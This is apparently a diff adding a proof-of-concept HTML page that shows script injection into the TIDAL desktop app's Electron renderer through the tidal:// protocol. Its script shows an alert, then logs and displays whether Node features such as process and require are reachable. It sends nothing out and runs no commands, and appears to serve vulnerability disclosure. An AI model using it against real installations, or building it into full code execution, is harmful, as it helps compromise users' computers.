@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC - TIDAL Protocol Injection</title>
+</head>
+<body>
+    <h1>PoC Loaded</h1>
+
+    <script>
+        alert("JavaScript execution confirmed in TIDAL desktop renderer");
+
+        console.log("[POC] Execution inside Electron renderer via tidal://");
+        console.log("URL:", window.location.href);
+        console.log("Origin:", window.location.origin);
+
+        // Existing check
+        console.log("nativeInterface present:", !!window.nativeInterface);
+
+        // Added context checks
+        console.log("process type:", typeof process);
+        console.log("process.versions:", process?.versions);
+        console.log("require type:", typeof require);
+        console.log("platform:", process?.platform);
+
+        // Dump useful info into DOM for screenshotting
+        document.body.style.background = "#111";
+        document.body.style.color = "#0f0";
+
+        document.body.innerHTML += "<p>Injected content executed successfully.</p>";
+        document.body.innerHTML += "<pre>" + JSON.stringify({
+            url: window.location.href,
+            origin: window.location.origin,
+            processType: typeof process,
+            versions: process?.versions,
+            requireType: typeof require,
+            platform: process?.platform,
+            nativeInterface: !!window.nativeInterface
+        }, null, 2) + "</pre>";
+    </script>
+</body>
+</html>
